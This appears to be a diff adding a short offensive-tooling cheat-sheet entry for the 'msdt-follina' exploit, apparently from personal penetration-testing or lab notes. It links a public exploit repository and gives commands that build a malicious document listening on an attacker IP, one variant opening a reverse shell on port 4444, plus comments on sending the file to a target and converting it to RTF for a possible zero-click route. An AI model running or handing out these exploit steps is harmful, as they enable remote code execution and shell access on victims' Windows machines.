@@ -1,0 +1,12 @@
+### msdt ###
+## links
+https://github.com/JohnHammond/msdt-follina
+
+## cmd
+cd /opt/tools/msdt-follina
+python3 follina.py --interface 10.8.98.114						# default will exec calc
+python3 follina.py --interface 10.8.98.114 -c WINRSHELL -r 4444				# exec rshell
+# send cp follina to target machine
+# convert to RTF to may have a zero click vuln
+
+
